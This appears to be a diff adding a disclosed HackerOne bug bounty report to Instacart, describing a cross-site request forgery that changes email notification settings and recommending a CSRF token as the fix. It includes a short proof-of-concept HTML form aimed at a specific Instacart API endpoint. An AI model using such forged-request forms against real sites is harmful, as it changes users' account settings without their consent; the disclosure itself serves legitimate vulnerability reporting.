@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/157956
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/trad_zero_h
+ReportedTo:Instacart(instacart)
+BountyAmount:50.0
+Severity:
+State:Closed
+DateOfDisclosure:15.09.2016 18:44:14
+
+Summary:
+
+Hi i found CSRF To change Email Notification Settings 
+
+The Code Of the HTML Page ::
+<html>
+  <body>
+    <form action="https://www.instacart.com/api/v2/email_settings/76/disable?resource_token=">
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+For Fixing you Must add CSEF Token to the Request 
+
+i attached Video Showing the Bug 
+
+Thanks  
